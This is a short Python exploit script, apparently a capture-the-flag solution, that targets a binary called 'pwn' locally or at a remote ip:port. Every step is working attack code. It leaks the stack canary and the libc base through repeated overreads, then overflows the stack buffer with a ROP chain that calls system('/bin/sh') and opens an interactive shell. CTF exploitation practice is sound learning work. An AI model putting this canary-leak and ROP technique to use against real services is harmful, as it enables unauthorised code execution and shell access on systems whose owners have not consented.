#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


def run(count, data, again=True):
    ru(b"How much???\n")
    sl(i2b(count))
    ru(b"ok... now send content\n")
    s(data)
    result = ru(b"wanna do it again?\n", drop=True).replace(data, b"").strip(b"\n")
    if again:
        sl(i2b(1337))
    else:
        sl(b"1")
    return result


res = run(0x100, b"a" * 0x49)
canary = u64_ex(res[:7]) << 8
lg("canary", canary)

payload = b"a" * 0x58
# payload += p64(canary)
res = run(0x100, payload)
libc_base = u64_ex(res) - 0x29D90
lg("libc_base", libc_base)

pop_rdi_ret = 0x000000000002A3E5 + libc_base

payload = b"a" * 0x48
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi_ret + 1)
payload += p64(pop_rdi_ret) + p64(libc_base + next(libc.search(b"/bin/sh\x00")))
payload += p64(libc_base + libc.sym.system)
run(0x100, payload, False)

ia()
